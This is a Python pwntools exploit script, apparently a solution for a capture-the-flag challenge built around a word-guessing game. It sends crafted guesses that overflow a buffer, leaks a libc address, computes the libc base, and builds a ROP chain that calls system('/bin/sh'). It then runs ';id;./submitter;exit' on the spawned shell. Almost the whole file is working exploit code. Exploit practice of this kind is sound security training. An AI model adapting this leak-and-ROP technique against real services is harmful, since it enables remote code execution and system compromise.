#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './challenge')

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

libc = ELF('./libc.so.6')


gdbscript = '''
#brva 0x16F7
#brva 0x167A 
continue
'''.format(**locals())

# -- Exploit goes here --

# io = start()
io = remote(HOST, int(PORT))

io.sendlineafter(b'How long will the solution word be?', b'10')
io.sendlineafter(b'How many guesses does the player get?', b'7')

io.sendafter(b'What is your guess', b'A'*9 + p8(80+0x24))
payload = (b'A'*9 + p8(70+0x24)) * 4 + (b'Y'*9 + p8(0x7f)) * 3 + b'B'*9 + p8(0x7f) + b'C'*28 + p32(80+28) + p32(5)
io.sendafter(b'What is your guess', payload)

leak = io.recvuntil(b'What is', drop=True)
leak = re.sub(br'\x1b[^m]*m', b'', leak)
leak = leak.replace(b'  ', b'')
# print(hexdump(leak))
libc_leak = u64(leak[-8:-2].ljust(8, b'\x00'))
log.info('libc leak: %#x', libc_leak)

libc.address = libc_leak - libc.libc_start_main_return
log.info('libc base: %#x', libc.address)

rop = ROP(libc)
rop.call(rop.ret)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = (b'A'*9 + p8(70+0x24)) * 2 + b'B'*9 + p8(0x7f) + b'C'*28 + p32(80+28) + p32(7) + b'X'*(70+0x24-66-28) + rop.chain() + b'A'*20
io.sendafter(b'your guess', payload)
io.recvuntil(b'You win!')

io.sendline(b';id;./submitter;exit')

io.stream()

